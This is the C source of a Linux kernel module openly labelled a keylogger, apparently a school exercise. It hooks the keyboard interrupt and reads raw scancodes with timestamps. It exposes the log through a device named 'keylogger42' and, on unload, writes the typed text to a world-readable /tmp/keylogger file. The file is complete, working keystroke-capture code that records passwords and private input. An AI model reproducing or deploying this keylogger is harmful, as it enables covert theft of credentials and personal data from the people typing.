#include "stroke.h"

static LIST_HEAD(strokehead);

/*
 * This variable is used as an identifier for shared interrupt lines.
 * Since many drivers can be loaded on the same line, free_irq needs
 * to know what driver it should free.
 * I set it to the address of strokehead, is it a good idea ?
 */
static void *line_id = &strokehead;

/*
 * An ISR blocks any other interrupt, so the goal is to leave the interrupt
 * handler as fast as we can. To do that I use a tasklet, which schedule a
 * function to be executed later, when the kernel has some time.
 * We are not in a time sensitive situation at all,
 * so take your time lovely kernel.
 */
DECLARE_TASKLET(tasklet_s, irq_keylogger, 0);

DEFINE_RWLOCK(log_lock);
DEFINE_RWLOCK(misc_lock);

static int keylogger_show(struct seq_file *seq, void *v)
{
	const struct stroke_s *cur;

	read_lock(&misc_lock);
	list_for_each_entry(cur, &strokehead, list) {
		seq_printf(seq, "%02d:%02d:%02d   %-13s (%#.2x) %s\n", \
				cur->time.tm_hour, \
				cur->time.tm_min, \
				cur->time.tm_sec, \
				cur->name, \
				cur->key, \
				IS_PRESSED(cur->state));
	}
	read_unlock(&misc_lock);
	return 0;
}

int my_open(struct inode *inode, struct file *file)
{
	/*
	 * Seq open does not use private_data, and will throw an WARN_ON
	 * if not set to null.
	 */
	file->private_data = NULL;
	return single_open(file, keylogger_show, NULL);
}

int my_release(struct inode *inode, struct file *file)
{
	return single_release(inode, file);
}

static void get_time(struct tm *time)
{
	struct timeval tv;

	do_gettimeofday(&tv);

	/*
	 * time_to_tm converts calendar time to tm struct.
	 * totalsecs is calibrated on UTC, so we add 1 hour to get GMT+1.
	 */
	time_to_tm(tv.tv_sec, 3600, time);
}

void irq_keylogger(unsigned long data)
{
	int scancode = inb(0x60);
	struct stroke_s *stroke;

	stroke = kmalloc(sizeof(struct stroke_s), GFP_ATOMIC);
	if (!stroke)
		return;
	stroke->state = scancode & 0x80;
	stroke->key = scancode & ~0x80;
	get_time(&stroke->time);
	stroke->name = IS_VALID(stroke->key);
	list_add_tail(&stroke->list, &strokehead);
}

static irqreturn_t irq_handler(int irq, void *dev_id)
{
	tasklet_schedule(&tasklet_s);
	return IRQ_HANDLED;
}

static void free_list(void)
{
	const struct stroke_s *cur;
	const struct stroke_s *tmp;

	list_for_each_entry_safe(cur, tmp, &strokehead, list) {
		kfree(cur);
	}
}

static const struct file_operations misc_fops = {
	.owner = THIS_MODULE,
	.open = my_open,
	.read = seq_read,
	.release = my_release
};

static struct miscdevice misc_s = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "keylogger42",
	.fops = &misc_fops
};

ssize_t file_write(struct file *file, const void *buf, size_t n)
{
	ssize_t ret = 0;
	loff_t offset = 0;

	read_lock(&log_lock);
	ret = kernel_write(file, buf, n, &offset);
	read_unlock(&log_lock);
	return ret;
}

static ssize_t write_tmp(void)
{
	struct stroke_s *cur = NULL;
	char buf[1024] = {0};
	int i = 0;
	ssize_t ret = 0;
	struct file *file;
	mm_segment_t oldfs;

	oldfs = get_fs();
	set_fs(get_ds());
	file = filp_open("/tmp/keylogger", O_CREAT | O_WRONLY | O_APPEND, 0444);
	if (IS_ERR(file))
		return -ENOENT;
	list_for_each_entry(cur, &strokehead, list) {
		if (i == sizeof(buf) - 1) {
			ret = file_write(file, buf, i);
			if (ret < 0)
				goto out;
			i = 0;
		}
		if (!cur->state && (!keytable[cur->key].command
					|| IS_PRINT_CMD(cur->key)))
			buf[i++] = keytable[cur->key].ascii;
	}
	ret = file_write(file, buf, i);
out:
	set_fs(oldfs);
	filp_close(file, NULL);
	return ret;
}

static int __init init_keyboard(void)
{
	int ret;

	ret = request_irq(1,			\
			irq_handler,		\
			IRQF_SHARED,		\
			"keylogger42",	\
			line_id);
	if (ret)
		return ret;
	pr_info("LOADED -- 42 keylogger module.\n");
	return misc_register(&misc_s);
}

static void __exit exit_keyboard(void)
{
	free_irq(1, line_id);
	tasklet_kill(&tasklet_s);
	if (write_tmp() < 0)
		pr_warn("WARNING! Something went wrong writing log file.\n");
	free_list();
	pr_info("UNLOADED -- 42 keylogger module.\n");
	misc_deregister(&misc_s);
}

module_init(init_keyboard);
module_exit(exit_keyboard);

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("agouby");
MODULE_DESCRIPTION("Keyboard driver, keylogger");
